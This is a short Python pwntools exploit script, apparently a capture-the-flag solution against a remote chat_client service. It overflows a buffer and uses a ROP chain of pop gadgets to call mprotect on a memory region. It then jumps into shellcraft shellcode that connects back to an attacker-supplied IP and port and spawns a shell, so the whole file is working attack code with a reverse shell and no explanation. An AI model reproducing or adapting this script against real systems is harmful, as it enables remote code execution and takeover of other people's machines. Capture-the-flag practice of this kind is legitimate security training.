from pwn import *

ip = 'your server ip'
port = 0 # your server port
r1 = remote('rcs.eatpwnnosleep.com', 13137)
r2 = remote('rcs.eatpwnnosleep.com', 13137)
#r1 = process('./chat_client')
#r2 = process('./chat_client')

mprotect = 0x44f410
poprdi = 0x00000000004006e6
poprsi = 0x00000000004028e3
poprdx = 0x0000000000405d16


r2.sendlineafter('>>', '1')
r2.sendlineafter('>>', 'a'*0xfd)

sleep(0.5)
r1.sendlineafter('>>', '2')
r1.sendafter('>>', 'a'*0xfd+'\x00'+'a'*4)

r2.recvuntil('==========Chat Start==========\n')
r1.recvuntil('==========Chat Start==========\n')

sc = shellcraft.amd64.linux.connect(ip, port) + shellcraft.amd64.linux.dupsh()
sc = asm(sc, arch='amd64')
pay = '\x90'*0x100
pay += sc.ljust(0x300-4, '\x90')
r1.send(pay)

pay = 'b'*(0x80-4)
pay += 'c'*8
pay += p64(poprdi) + p64(0x6d6000)
pay += p64(poprsi) + p64(0x3000)
pay += p64(poprdx) + p64(7)
pay += p64(mprotect) + p64(0x6d6a00)
pay = pay.ljust(0x400-5, '\x00')
r1.sendline(pay)

r2.sendline('/bye')
r1.sendline('/bye')
r1.sendlineafter('>>', '3')
